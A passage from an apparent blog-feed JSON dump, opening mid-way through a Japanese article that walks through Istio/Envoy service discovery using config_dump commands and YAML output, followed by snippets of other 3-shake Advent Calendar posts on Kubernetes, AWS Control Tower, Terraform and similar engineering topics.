(例：宛先IPアドレス、ポート番号、パス、ホストなど) に応じてリスナーを選びます。(3) Envoyによるルート選択Envoyは、リスナーに紐づくルートを選びます。▶ TCPリクエストを処理する場合についてDebugging Your Debugging Tools: What to do When Your Service Mesh Goes Down | PPT(4) Envoyによるクラスター選択Envoyは、クラスターに紐づくクラスターを選びます。(5) Envoyによるエンドポイント選択Envoyは、クラスターに紐づくエンドポイントを選びます。(6) 宛先マイクロサービスへのリクエスト送信Envoyは、エンドポイントに対応するインスタンスにリクエストを送信します。Envoyで確認した宛先情報を\uD83D\uDC46に当てはめて見ていくことにしましょう。EnvoyがADS-APIから取得した宛先情報を見てみようconfig_dumpエンドポイント実際にEnvoyに登録されている宛先情報は、istio-proxyコンテナ自体のlocalhost:15000/config_dumpからJSON形式で取得できます。もしお手元にIstioがある場合は、Envoyにどんな宛先情報が登録されているか、Envoyを冒険してみてください。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump\\" | yq -P▶ 宛先情報を見やすくするyqコマンドについてyqコマンドでYAMLに変換すると見やすくなります\uD83D\uDC4Dリスナー▼ 確認方法istio-proxyコンテナがADS-APIから取得したリスナーは、/config_dump?resource={dynamic_listeners}から確認できます。ここでは、foo-pod内でbar-podのリスナーを確認したと仮定します。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?resource={dynamic_listeners}\\" | yq -P▼ 結果以下を確認できました。宛先IPアドレスや宛先ポート番号に応じてリスナーを選べるようになっており、ここでは<任意のIPアドレス>:50002。リスナーに紐づくルートの名前configs:  - \\"@type\\": type.googleapis.com/envoy.admin.v3.ListenersConfigDump.DynamicListener    # リスナー名    name: 0.0.0.0_50002    active_state:      version_info: 2022-11-24T12:13:05Z/468      listener:        \\"@type\\": type.googleapis.com/envoy.config.listener.v3.Listener        name: 0.0.0.0_50002        address:          socket_address:            # 受信したパケットのうちで、宛先IPアドレスでフィルタリング            address: 0.0.0.0            # 受信したパケットのうちで、宛先ポート番号でフィルタリング            port_value: 50002        filter_chains:          - filter_chain_match:              transport_protocol: raw_buffer              application_protocols:                - http/1.1                - h2c            filters:              - name: envoy.filters.network.http_connection_manager                typed_config:                  \\"@type\\": type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager                  stat_prefix: outbound_0.0.0.0_50001                  rds:                    config_source:                      ads: {}                      initial_fetch_timeout: 0s                      resource_api_version: V3                    # 本リスナーに紐づくルートの名前                    route_config_name: 50002  ...  - \\"@type\\": type.googleapis.com/envoy.admin.v3.ListenersConfigDump.DynamicListener  ...Administration interface — envoy 1.32.0-dev-bfa0e0 documentationConfigDump (proto) — envoy 1.32.0-dev-bfa0e0 documentationルート▼ 確認方法istio-proxyコンテナがADS-APIから取得したリスナーは、/config_dump?resource={dynamic_route_configs}から確認できます。ここでは、foo-pod内でbar-podのルートを確認したと仮定します。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?resource={dynamic_route_configs}\\" | yq -P▼ 結果コマンドを実行するとYAMLを取得でき、以下を確認できました。リスナーを取得した時に確認できたルートの名前リクエストのパスやHostヘッダーに応じてルートを選べるようになっているルートに紐づくクラスターの名前configs:  - \\"@type\\": type.googleapis.com/envoy.admin.v3.RoutesConfigDump.DynamicRouteConfig    version_info: 2022-11-24T12:13:05Z/468    route_config:      \\"@type\\": type.googleapis.com/envoy.config.route.v3.RouteConfiguration      # ルートの名前      name: 50002      virtual_hosts:        - name: bar-service.bar-namespace.svc.cluster.local:50002          # ホストベースルーティング          domains:            - bar-service.bar-namespace.svc.cluster.local            - bar-service.bar-namespace.svc.cluster.local:50002            - bar-service            - bar-service:50002            - bar-service.bar-namespace.svc            - bar-service.bar-namespace.svc:50002            - bar-service.bar-namespace            - bar-service.bar-namespace:50002            - 172.16.0.2            - 172.16.0.2:50002          routes:            - match:                # パスベースルーティング                prefix: /              route:                # 本ルートに紐づくクラスターの名前                cluster: outbound|50002|v1|bar-service.bar-namespace.svc.cluster.local                timeout: 0s                retry_policy:                  retry_on: connect-failure,refused-stream,unavailable,cancelled,retriable-status-codes                  num_retries: 2                  retry_host_predicate:                    - name: envoy.retry_host_predicates.previous_hosts                  host_selection_retry_max_attempts: \\"5\\"                  retriable_status_codes:                    - 503                max_stream_duration:                  max_stream_duration: 0s                  grpc_timeout_header_max: 0s              decorator:                operation: bar-service.bar-namespace.svc.cluster.local:50002/*  ...  - \'@type\': type.googleapis.com/envoy.admin.v3.RoutesConfigDump.DynamicRouteConfig  ...Administration interface — envoy 1.32.0-dev-bfa0e0 documentationConfigDump (proto) — envoy 1.32.0-dev-bfa0e0 documentationクラスター▼ 確認方法istio-proxyコンテナがADS-APIから取得したクラスターは、/config_dump?resource={dynamic_active_clusters}から確認できます。ここでは、foo-pod内でbar-podのクラスターを確認したと仮定します。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?resource={dynamic_active_clusters}\\" | yq -P▼ 結果コマンドを実行するとYAMLを取得でき、以下を確認できました。ルートを取得した時に確認できたクラスターの名前クラスターに紐づくエンドポイントの親名configs:  - \\"@type\\": type.googleapis.com/envoy.admin.v3.ClustersConfigDump.DynamicCluster    version_info: 2022-11-24T12:13:05Z/468    cluster:      \\"@type\\": type.googleapis.com/envoy.config.cluster.v3.Cluster      # クラスターの名前      name: outbound|50002|v1|bar-service.bar-namespace.svc.cluster.local      type: EDS      eds_cluster_config:        eds_config:          ads: {}          initial_fetch_timeout: 0s          resource_api_version: V3        # 本クラスターに紐づくエンドポイントの親名        service_name: outbound|50002|v1|bar-service.bar-namespace.svc.cluster.local  ...  - \\"@type\\": type.googleapis.com/envoy.admin.v3.ClustersConfigDump.DynamicCluster  ...Administration interface — envoy 1.32.0-dev-bfa0e0 documentationConfigDump (proto) — envoy 1.32.0-dev-bfa0e0 documentationエンドポイント▼ 確認方法istio-proxyコンテナがADS-APIから取得したクラスターは、/config_dump?include_edsから確認できます。ここでは、foo-pod内でbar-podのクラスターを確認したと仮定します。$ kubectl exec \\\\    -it foo-pod \\\\    -n foo-namespace \\\\    -c istio-proxy \\\\    -- bash -c \\"curl http://localhost:15000/config_dump?include_eds\\" | yq -P▼ 結果コマンドを実行するとYAMLを取得でき、以下を確認できました。クラスターを取得した時に確認できたエンドポイントの親名bar-podのインスタンスが3個あるため、3個のエンドポイントがありますconfigs:  dynamic_endpoint_configs:    - endpoint_config:        \\"@type\\": type.googleapis.com/envoy.config.endpoint.v3.ClusterLoadAssignment        # エンドポイントの親名        cluster_name: outbound|50002|v1|bar-service.bar-namespace.svc.cluster.local        endpoints:          - locality:              region: ap-northeast-1              zone: ap-northeast-1a            lb_endpoints:              - endpoint:                  address:                    socket_address:                      # 冗長化されたbar-podのIPアドレス                      address: 11.0.0.1                      # bar-pod内のコンテナが待ち受けているポート番号                      port_value: 50002                  health_check_config: {}                health_status: HEALTHY                metadata:                  filter_metadata:                    istio:                      workload: bar                    envoy.transport_socket_match:                      tlsMode: istio                # ロードバランシングアルゴリズムを決める数値                load_balancing_weight: 1          - locality:              region: ap-northeast-1              zone: ap-northeast-1d            lb_endpoints:              - endpoint:                  address:                    socket_address:                      # 冗長化されたbar-podのIPアドレス                      address: 11.0.0.2                      # bar-pod内のコンテナが待ち受けているポート番号                      port_value: 50002                  health_check_config: {}                health_status: HEALTHY                metadata:                  filter_metadata:                    istio:                      workload: bar                    envoy.transport_socket_match:                      tlsMode: istio                # ロードバランシングアルゴリズムを決める数値                load_balancing_weight: 1          - locality:              region: ap-northeast-1              zone: ap-northeast-1d            lb_endpoints:              - endpoint:                  address:                    socket_address:                      # 冗長化されたbar-podのIPアドレス                      address: 11.0.0.3                      # bar-pod内のコンテナが待ち受けているポート番号                      port_value: 50002                  health_check_config: {}                health_status: HEALTHY                metadata:                  filter_metadata:                    istio:                      workload: bar                    envoy.transport_socket_match:                      tlsMode: istio                # ロードバランシングアルゴリズムを決める数値                load_balancing_weight: 1        policy:          overprovisioning_factor: 140    ...    - endpoint_config:    ...Administration interface — envoy 1.32.0-dev-bfa0e0 documentationConfigDump (proto) — envoy 1.32.0-dev-bfa0e0 documentation▶ Envoyの負荷分散方式についてload_balancing_weightキー値が等しい場合、EnvoyはP2Cアルゴリズムに基づいてロードバランシングします\uD83D\uDC4DEnvoyの処理の流れのまとめ確認できた宛先情報を、Envoyの処理の流れに当てはめてみました。(1) 送信元マイクロサービスからリクエスト受信送信元マイクロサービスは、宛先マイクロサービス (<任意のIP>/:50002) にリクエストを送信します。サイドカーコンテナのistio-proxyコンテナはこれを受信します。(2) Envoyによるリスナー選択Envoyは、リクエストの宛先 (IPアドレス、ポート番号、パス) からPodのリスナー (0.0.0.0_50002) を選びます。(3) Envoyによるルート選択Envoyは、リスナーに紐づくPodのルート (50002) を選びます。(4) Envoyによるクラスター選択Envoyは、クラスターに紐づくPodのクラスター (outbound|50002|v1|bar-service.bar-namespace.svc.cluster.local) を選びます。(5) Envoyによるクラスター選択Envoyは、クラスターに紐づくPodのインスタンスのエンドポイント (11.0.0.X/:50002) を選びます。(6) 宛先マイクロサービスへのリクエスト送信Envoyは、エンドポイントの宛先にPodのリクエストを送信します。サービスディスカバリーの冒険は以上です⛵05. おわりにIstioの機能の1つである『サービスディスカバリー』の仕組みを、Envoyを交えながらもりもり布教しました。愛が溢れてしまいました。Istioの機能を1つとっても、複雑な仕組みで実現していることがお分かりいただけたかと思います。Istioありがとう\uD83D\uDE4F\uD83D\uDE4F\uD83D\uDE4F謝辞3-shake SRE Tech Talk での発表前後に、以下の方々に発表内容について助言をいただきました。@ido_kara_deru さん@yosshi_ さん@yteraoka さん(アルファベット順)また、今回の 3-shake Advent Calender 2022 は、以下の方々に企画いただきました。@jigyakkuma_ さん@nwiizo さん(アルファベット順)皆様に感謝申し上げます\uD83D\uDE47\uD83C\uDFFB‍記事関連のおすすめ書籍Istio in Action (English Edition)作者:Posta, Christian E.,Maloku, RinorManningAmazonIstio: Up and Running: Using a Service Mesh to Connect, Secure, Control, and Observe作者:Calcote, Lee,Butcher, ZackO\'ReillyAmazon","isoDate":"2022-12-24T21:00:00.000Z","dateMiliSeconds":1671915600000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"Linkerdにおけるトラフィック制御","link":"https://zenn.dev/kimitsu/articles/linkerd-traffic-control","contentSnippet":"Linkerd は Kubernetes 用の軽量サービスメッシュです。複雑な設定なしにセキュリティ、可観測性、信頼性をクラスタに追加できるのが特徴とされています。また CNCF では Graduated Project としてホストされています。（ちなみにサービスメッシュのデファクトスタンダードとされている Istio は CNCF では Incubating Project です。）Linkerd の機能の 1 つにトラフィックの制御があります。これはある Pod にリクエストを投げられるのは特定の Pod だけというような制限をかけるためのものです。トラフィック制御の設...","isoDate":"2022-12-24T12:56:07.000Z","dateMiliSeconds":1671886567000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"Steam Deck に Windows を入れたい方の参考になれば...!","link":"https://qiita.com/tozastation/items/a57df36a369b5425795a","contentSnippet":"この記事は 3-shake Advent Calendar 2022 の24日目の記事です。はじめに年末、しかもクリスマスということで散財させていただきました。初めまして、戸澤といいます。日常では「たらこさん」「サーモンさん」と呼ばれています。日々の業務としては、3...","isoDate":"2022-12-24T08:36:33.000Z","dateMiliSeconds":1671870993000,"authorName":"tozastation","authorId":"tozastation"},{"title":"KubernetesのマニフェストをCIで検査する方針を考える","link":"https://zenn.dev/tayusa/articles/ad9fafa197888b","contentSnippet":"このエントリーは 3-shake Advent Calendar 2022 17日目の記事です。https://qiita.com/advent-calendar/2022/3-shake 概要以下の気持ちでKubernetesのマニフェストを検査するツールを選定しました。ベストプラクティスに則りたい細かなレビューの手間を省きたいセキュリティリスクを排除したい保守するのが大変なので出来るだけ自分でポリシーは書きたくない。書くとしても書きやすい方法で記述したい 検査ツールの選定以下のツールからカテゴリ別に選定することにしました。スキーマ検査kubeval...","isoDate":"2022-12-17T03:48:50.000Z","dateMiliSeconds":1671248930000,"authorName":"Atsuya Tsukada","authorId":"atsuya0"},{"title":"CloudWatch Logs のログストリームごとのサイズを取得する","link":"https://zenn.dev/toshikish/articles/684e4d7ed4532f","contentSnippet":"動機Amazon CloudWatch Logs のログストリームごとのサイズを知りたいことがありました。たとえば Amazon EKS クラスタを立ち上げて Fluentd または Fluent Bit でログを CloudWatch Logs に送る設定をすると，Pod のログは単一のロググループ（デフォルトでは /aws/containerinsights/Cluster_Name/application）に集約されます。https://docs.aws.amazon.com/AmazonCloudWatch/latest/monitoring/Container-Ins...","isoDate":"2022-12-16T08:57:33.000Z","dateMiliSeconds":1671181053000,"authorName":"toshikish","authorId":"toshikish"},{"title":"エンジニア市場拡大のための「憧れの職業」の重要性に関する緒論","link":"https://qiita.com/skikkh/items/21c270c7ff7a942dc5f7","contentSnippet":"はじめに今回、4年ぶりにQiitaに記事を投稿させていただく。ひょんなきっかけ1で私は、自身が勤めるスリーシェイクのアドベントカレンダーである3-shake Advent Calendar 2022の16日目を担当することとなった。本投稿がそれに当たる。私は、現在3...","isoDate":"2022-12-16T02:21:05.000Z","dateMiliSeconds":1671157265000,"authorName":"skikkh","authorId":"skikkh"},{"title":"⛵️ Istioのサービス間通信を実現するサービスディスカバリーの仕組み","link":"https://speakerdeck.com/hiroki_hasegawa/istioniyorusahisuteisukaharinoshi-zu-mi","contentSnippet":"『3-shake SRE Tech Talk』の登壇資料です\\r\\rIstioのサービスディスカバリーの仕組みについて、Envoyを交えながら解説しました。\\r\\rスライドでは仕組みの詳細を解説できませんでしたので、ぜひ元記事 (Istioのサービス間通信を実現するサービスディスカバリーの仕組み) も参照ください\uD83D\uDC4D\\r\\r\uD83D\uDC26 ツイート：https://x.com/Hiroki__IT/status/1603344099368570880","isoDate":"2022-12-15T05:00:00.000Z","dateMiliSeconds":1671080400000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"Play with \uD83D\uDC10 in Kubernetes","link":"https://speakerdeck.com/kyohmizu/play-with-in-kubernetes","contentSnippet":"3-shake SRE Tech Talk 2022 クリスマス直前会！の資料です。\\rhttps://3-shake.connpass.com/event/267080/","isoDate":"2022-12-15T05:00:00.000Z","dateMiliSeconds":1671080400000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"【Istio⛵️】\\"3-shake SRE Tech Talk\\" に登壇","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2022/12/15/025523","contentSnippet":"発表スライドから得られる知識発表スライドを見ると、以下を \\"完全に理解\\" できます✌️Istioのサービスディスカバリーの仕組みについて発表スライドから得られる知識イベント名発表スライドイベント名オッス！オラ長谷川！✋\uD83C\uDFFB『Istioのサービス間通信を実現するサービスディスカバリーの仕組み』ていうテーマで、 3-shake SRE Tech Talk に登壇したぞ！https://3-shake.connpass.com/event/267080/発表スライドみんな！スライドぜってぇ見てくれよな！本日の発表資料です！⛵️#SRETThttps://t.co/0MKMYVa77u— 長谷川 広樹 (地下強制労働者) (@Hiroki__IT) December 15, 2022 ちな、発表内容の詳細はこの記事をみてくれよな！","isoDate":"2022-12-15T03:00:00.000Z","dateMiliSeconds":1671073200000,"authorName":"長谷川 広樹","authorId":"hiroki-hasegawa"},{"title":"時間がない人のための AWS Solutions Architect - Professional 勉強法","link":"https://zenn.dev/toshikish/articles/06d85a2db79f4d","contentSnippet":"難度が高くしっかりとした準備が必要な AWS SA Pro 試験を申し込んだものの，残された時間があまりないという方向けに書いた勉強法の記事です。 試験の概略 特徴長文の選択式問題が75問出題され，それを180分で解くという長丁場な試験です。ざっくり1問あたり2分24秒かけられます。75問もあり，1問に複数のサービスを関連させられるので，AWS が重点的に問いたいサービス・テーマはもれなく出現します。AWS を使った2年以上の実務経験が想定されていますが，たいていの場合，実務で扱うサービスは主要なサービスに限られ，触ったこともないサービスが多く出題されます。そのため，確...","isoDate":"2022-12-12T10:46:25.000Z","dateMiliSeconds":1670841985000,"authorName":"toshikish","authorId":"toshikish"},{"title":"AWS Control Towerを調べる","link":"https://blog.masasuzu.net/entry/2022/12/10/204957","contentSnippet":"これは  3-shake Advent Calendar 2022 10日目の記事です仕事の中でAWSで複数のアカウントを管理したいという要件あり、その中でAWS Control Towerが使えないかなと調べたものをざっくりと書いていきます。AWS Control TowerとはAWS Control TowerとはLanding Zoneを実装するためのAWSのマネージドサービスです。そもそもLanding Zoneって何って話になりますね。Landing Zoneとはセキュリティとコンプライアンスのベストプラクティスに基づきアーキテクチャ設計とマルチアカウント環境を管理する仕組みを指します。Landing Zoneは、下記機能から構成されます。アカウントの発行必要な初期設定の済んだアカウントを作成管理用権限の発行対象アカウントを管理するための権限を作成AWS ログの集約監査用ログをセキュアに一元保存ガードレールの設置実施してはいけない操作の禁止危険な設定の監視Landing Zoneの実装方法AWS Control TowerAWSサービスとして提供される Landing Zoneです。容易に利用可能ですが、カスタマイズするには制限があります。(必須のガードレールを外せなかったり)主にこれからAWSを利用する場合に利用できます。既存アカウントにも適用可能です。独自実装の Landing Zone自組織で独自実装するパターンです。自組織の方針に従って自由にカスタマイズできるのが強みです。ただし、自由にカスタマイズはできますが、自身でメンテナンスしないといけないので、コストはかかります。主に既存アカウントに適用する場合に利用できます。自組織でアカウント発行の仕組みや管理の仕組みができあがってる場合などです。そもそもなんでマルチアカウントにするのかAWSをマルチアカウントにする観点として以下のものが考えられます。環境の分離開発、テスト、本番を分離することによるセキュリティおよび統制の確保請求の分離部門やシステム単位でのコスト明確化権限の分離部門間での権限分離およびアカウントへの権限移譲複雑性の分離アカウントの目的を明確に絞ることで、構成がシンプルになるAWS Organizationsだけでもできることマルチアカウント管理するだけならOrganizationだけでもある程度はできます。むしろAWS Control TowerはOrganizationの機能を利用しています。複数AWSアカウントの一元管理Organization Unit(OU)の作成複数アカウントのグルーピング化AWSアカウントの発行Service Control Policyの作成、OUへの適用複数アカウントの一括請求AWS Control Towerだと何ができるのかControl Towerで提供される機能として以下のものがあります。Landing Zoneの提供AWS Organizationを使用してマルチアカウントを作成デフォルトでSandbox、SecurityのOUを作成AWS IAM アイデンティティセンターを利用したID管理を提供Account FactoryAWSアカウントのプロビジョニングの自動化設定可能なテンプレートを提供CloudTrailとConfigログの保存Log Archiveアカウント内のS3バケットに一元的に保存されるガードレールの提供必須と任意の観点の2種類と予防的と発見的の2種類の組み合わせがありControl Towerにより管理下のアカウントに適用される参考: ガードレールの仕組み予防的ガードレール(Service Control Policy)禁止されたアクションの実行が拒否される仕組みControl Tower管理下のアカウントは必須の予防的ガードレールで禁止されているアクションが不可能発見的ガードレール(Config)特定のイベントが発生したときにCloudTrailに記録される仕組みダッシュボードOUやアカウント、ガードレール違反などが一覧表示できるAWS Control TowerではできないことAWS Control Towerでは提供されてない機能もあります。GuardDutyやSecurity Hubなどのセキュリティ機能を組織全体適用するにはOrganizationsの機能を利用する必要があります。AWS Control Towerの注意点、制約事項いろいろ資料を見てみてこの辺注意が必要かなという点を書いていきます。注意点既存アカウントの Control Tower への受入処理時にエラーになった場合、スタックセット内で自動実行される作業の一部手作業が必要になる参考:トラブルシューティング - AWS Control Tower独自ガードレールの追加は可能だが、容易ではない。必須ガードレールを外せない参考:必須のガードレール - AWS Control Tower各種セキュリティー機能は自動で有効化されないため、Control Towerの範囲外のセキュリティ機能は Control Tower の機能の外で管理が必要になる範囲内の機能: Config, CloudTrail, SCP範囲外の機能: GuardDuty, Security Hub, IAM Access Analyzer, DetectiveControl Tower 未対応リージョンを使用している場合、Control Tower適用リージョンと適用外リージョンが混在して管理が煩雑になる大阪リージョン未対応なのでマルチリージョンを考えるときに注意Control Towerはマネージドサービスであるが追加機能によっては手動バージョンアップ が必要になるケースがある参考: ランディングゾーンを更新する - AWS Control Tower参考: 更新について - AWS Control Towerログアーカイブアカウントで独自のログバケットを作成可能だが、非推奨参考: ランディングゾーンのセットアップに関する管理上のヒントリージョンの使用を制限する SCP の併用に注意が必要参考: AWS Control Tower リソースの作成および変更に関するガイダンスIaC との境界の検討が必要アカウント発行に関してはControl Tower(Account Factory)で手動で行い、その後のアカウント設定はTerraformで行うなどAccount Factory for Terraformを利用することでAWSアカウント発行は可能参考: AWS Control Tower Account Factory for Terraform によるアカウントのプロビジョニングどこまでTerraformで対応するかは別途検討が必要制限とクォータS３へのログの保存期間は、最大15年間保存可能(最近アップデートされた)Security OU の共有アカウントの E メールアドレスは変更可能だが、これらの変更を AWS Control Tower コンソールで確認するには、Landing Zone を更新する必要があるAWS Control Tower Landing zone の OU には、OU あたり5個のSCPの制限が適用される300超のアカウントを持つ既存の OU は、AWS Control Tower に登録することはできない300を超える場合はOUを分ける必要があるOUのネストは２段階まで、孫OUを持つことはできない参考: AWS Organizations における組織単位のベストプラクティスAWS Control Towerを使うべきなのかマルチアカウントを展開していくのであれば、AWSのベストプラクティスに乗れるので、使用するのが無難です。ただし、独自のLanding Zoneをすでに構築しており、Account Factoryの仕組みも独自で構築できているのであれば、移行コストを鑑みてそのままでも問題ないです。必須の予防的ガードレールが許容できない、OUなどの制限にひっかるなどの運用上の制約がある場合は使えないので、組織のポリシーを見直すか、独自でLanding Zoneを作るかを考える必要があります。発展もっと調査したかったが、時間が足りなかったことや今後調べたいことです。コンソールからAccount Factory実行するとService Catalogの設定項目がありますが、Service Catalog自体の理解不足でどう扱うのかが把握できてないのでこの辺調べたいです。Account Factory for Terraform(AFT)を使うとアカウント発行そのものもIaC化できるので試したい。参考: AWS Control Tower Account Factory for Terraform によるアカウントのプロビジョニング参考: ついにControl Towerのアカウント発行からカスタマイズまでIaC対応！Account Factory for Terraform (AFT)が新登場 #reinvent | DevelopersIOCustomization for Control Tower(CfCT)を使うとアカウント発行のイベントをトリガーにCloudFormationを実行できるので、これも実験したい。参考: AWS Control Tower のカスタマイズ (CfCT) の概要 - AWS Control Tower参考: Control Towerカスタマイズソリューション(CfCT)を使ってガードレールとCloudFormationを自動展開してみた | DevelopersIOまとめControl Towerについて調べたことを書いていきました。実運用自体はまだしてないので、これから触ってみて知見が溜まってきたらまたそれも共有できたらと思います。","isoDate":"2022-12-10T11:49:57.000Z","dateMiliSeconds":1670672997000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"インシデント対応しながら書くポストモーテム","link":"https://zenn.dev/toshikish/articles/1d5bcf9ed1939d","contentSnippet":"このエントリーは 3-shake Advent Calendar 2022 8日目の記事です。サービスにおいてインシデントが発生した場合に書くポストモーテムについて，書く負担を減らせるようなテンプレートを提案します。 ポストモーテムのテンプレートポストモーテムのテンプレートは，例えば以下のようなものが公開されています。 Google SREhttps://sre.google/sre-book/example-postmortem/タイトル・インシデント ID日付対応者ステータス概要影響主な原因障害発生のトリガー解決策検知アクションアイテム...","isoDate":"2022-12-07T22:00:00.000Z","dateMiliSeconds":1670450400000,"authorName":"toshikish","authorId":"toshikish"},{"title":"社会に蔓延る労苦〈Toil〉をなくす（株式会社スリーシェイク入社エントリ）","link":"https://qiita.com/tayakun/items/2f5ca30b777a54b2c52d","contentSnippet":"このエントリーは 3-shake Advent Calendar 2022 5日目の記事です。前日は @aqarium さんによる 徒然なるままにDatadog APM でした。私は株式会社スリーシェイクに入社し１ヶ月がたちました。そこで入社エントリーを書き、どうして...","isoDate":"2022-12-05T14:18:53.000Z","dateMiliSeconds":1670249933000,"authorName":"Soichiro Taya","authorId":"tayakun"},{"title":"Prometheus で探索対象の ServiceMonitor を広げる","link":"https://zenn.dev/toshikish/articles/70424038397d6d","contentSnippet":"Kubernetes クラスタで Prometheus を導入し，ServiceMonitor を作って監視対象を定義したところ，一向に Target として追加されないことがありました。ServiceMonitor が作られているだけでは不十分で，Prometheus の探索する対象に入っている必要があります。それがどこで定義されているかを調べました。以下のような ServiceMonitor を考えます。apiVersion: monitoring.coreos.com/v1kind: ServiceMonitormetadata:  name: example-serv...","isoDate":"2022-12-05T09:53:34.000Z","dateMiliSeconds":1670234014000,"authorName":"toshikish","authorId":"toshikish"},{"title":"Cloud Runで定期ジョブを実行する","link":"https://zenn.dev/satohjohn/articles/20ebf8d1bed1d1","contentSnippet":"本記事は GCP(Google Cloud Platform) Advent Calendar 2022 の4日目のものです。3日目は @po3rin さんのAPI on GKE に高速で認証をつけるIdentity-Aware Proxy \xd7 Identity Platform でした。 概要普段、GCPを使ったWebアプリケーション開発をしていますが、その中で、定期的に(スケジューリングをして)、ジョブを実行するということがあります。例えば、DBのデータの整合性とか、ログの収集とか。。。この要件のときは、GCP内で完結させるとして、Cloud SchedulerのHTTP...","isoDate":"2022-12-04T13:48:19.000Z","dateMiliSeconds":1670161699000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Codecov非対応の言語でもCodecovみたいなことをしたい時","link":"https://zenn.dev/kimitsu/articles/coverage-like-codecov","contentSnippet":"Codecov は、PR へのコメントや README のバッジのような方法でコードのカバレッジを可視化できるツールです。カバレッジを開発者に対して頻繁にフィードバックすることで、開発者はテストを意識するようになります。一方で世の中には星の数ほど言語がありますが Codecov がサポートしているものは意外と少ないです。https://docs.codecov.com/docs/supported-languagesまた色々な理由で Codecov を使いたくない / 使えないという場合もあるかと思います。この記事では Codecov 非対応の言語でも Codecov みたいな...","isoDate":"2022-11-29T13:38:06.000Z","dateMiliSeconds":1669729086000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"複数の Terraform リソースを一度に別の tfstate ファイルに移動する","link":"https://zenn.dev/toshikish/articles/61db8661cb28ba","contentSnippet":"Terraform の tfstate ファイル間のリソースの移動方法は，基本的には以下の記事の通りです。https://www.karakaram.com/moving-terraform-resources-to-another-tfstate-file/この記事では複数リソースを移動したい場合の方法を書きます。 方法やることはシンプルで，リソースをファイルで列挙して xargs で terraform state mv を繰り返すだけです。移動元ディレクトリで terraform state list を実行することで，その tfstate ファイル内の全リソースを取...","isoDate":"2022-11-25T07:33:50.000Z","dateMiliSeconds":1669361630000,"authorName":"toshikish","authorId":"toshikish"},{"title":"docker-buildxとmulti-platform build周りについてまとめ","link":"https://zenn.dev/bells17/articles/docker-buildx","contentSnippet":"最近docker buildxを使ったmulti-platform build周りについての知見がある程度溜まってきたので必要そうな情報をまとめておく。buildx自体が実際に使うとハマりどころが多いので、すんなりと納得できるような文章がかけてないとは思うけど、実際に触る人がハマったり疑問に思ったりする内容の穴埋めはある程度できてるとは思ってる。ちなみにこの記事を書いてる時点のdocker-buildxの最新バージョンがv0.9.1なので、貼ってあるbuildxのリンクについては基本このバージョンのものになる。 docker-buildxってなに？リポジトリを見るとdock...","isoDate":"2022-11-19T16:52:45.000Z","dateMiliSeconds":1668876765000,"authorName":"bells17","authorId":"bells17"},{"title":"AWS IAM ポリシーの StringNotEquals 条件の複数値指定は AND になる","link":"https://zenn.dev/toshikish/articles/2d9274783acbae","contentSnippet":"AWS IAM ポリシーの条件で同一キーに対して複数値を指定した場合，通常は OR で評価されます。例えば，以下の StringEquals 条件の例では，aws:PrincipalTag/role が audit または security のいずれかであれば true になります。\\"Condition\\": {  \\"StringEquals\\": {    \\"aws:PrincipalTag/role\\": [ \\"audit\\", \\"security\\" ]  }}では StringNotEquals 条件にするとどうでしょうか？例えば以下のポリシーで aws:Principal...","isoDate":"2022-11-10T08:31:56.000Z","dateMiliSeconds":1668069116000,"authorName":"toshikish","authorId":"toshikish"},{"title":"2022年10月のふりかえり、まとめ","link":"https://blog.masasuzu.net/entry/2022/11/09/082007","contentSnippet":"7年ぶりにふり返りするような気がします。これぶりですかね。blog.masasuzu.net10月は思い立って細かいことでも記録に残すようにし始めたのでサブブログの月間投稿数が増えてます。このまま続けたいところです。メインブログは相変わらず0なのでちゃんと書きたいところではあります。2022-10-01から1ヶ月間の記事一覧 - ふり返る暇なんて無いね仕事10月は端境期だったので、技術検証をメインでやってました。技術メインブログの方はどちらかというとパブリック向けに書いてます。ただ、この方針だと記事がゆるい記事が書きにくくなってきたので、サブブログを作った経緯があります。サブブログの技術記事は他の誰かのためではなく未来の自分が思い出すために書くをモットーに書いてます。なのでゆるく、細かい系のことも気軽に書いてます。分からないことは分からないと明示する。途中でも経過を残す。恥も残す。そんな感じです。以前とくらべてGoogle Cloud回りを10月はいじってた感じですね。build-in commandのmanが引けなくて困った - ふり返る暇なんて無いねt3系インスタンスのスペックについて - ふり返る暇なんて無いねGoogle Cloudの外部HTTP(S)ロードバランサと外部HTTP(S)ロードバランサ(従来型)の違いがわからなかった。 - ふり返る暇なんて無いね未解決: Google Cloud Storageの静的配信でnginxで言うところのtry_files的なことをしたかった。。。。 - ふり返る暇なんて無いねはてなブログのカテゴリごとのRSSフィード - ふり返る暇なんて無いねGitHub Actionsで save-state とset-output が廃止されるようです。 - ふり返る暇なんて無いね故障と障害の違いがわからずに困惑してた - ふり返る暇なんて無いね資格PCA取りました!11月にはPCA、KCNA、年内にCKA、CKADを取ることを目標に業務とは別に学習してます。なお、業務ではGoogle CloudもKubernetesも今のところ触る余地ないです。が、将来の投資として学習してます。近い未来で使うのが目に見えてるので。Google Cloud認定 Professional Cloud Architect合格してた - ふり返る暇なんて無いね11月末ターゲットで2個資格試験受けます - ふり返る暇なんて無いね旅土曜日の午前中に温泉入るのにはまってます。休日の早い時間に行動すると時間の有効活用ができるなとしみじみ感じてます。人生に疲れたので熱海で温泉入ってきた - ふり返る暇なんて無いね横須賀で温泉入ってきた - ふり返る暇なんて無いね江ノ島に行ってきて午前中だけで満足した - ふり返る暇なんて無いね生活寒くなりましたが、がんばります。今季初暖房使いました。 - ふり返る暇なんて無いね技術書を複数回読むということ - 